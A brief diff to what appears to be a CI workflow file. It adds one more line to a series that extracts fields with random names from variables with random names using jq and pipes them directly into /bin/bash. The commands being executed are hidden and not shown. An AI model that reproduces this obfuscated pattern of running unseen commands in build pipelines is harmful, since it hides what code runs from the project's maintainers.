@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$ed387" | jq -r .hfm45 | /bin/bash
           echo $phjy8 | jq -r .c8 | /bin/bash
           echo $uvuco4 | jq -r .mg76 | /bin/bash
+          echo $t1 | jq -r .sxhv82 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
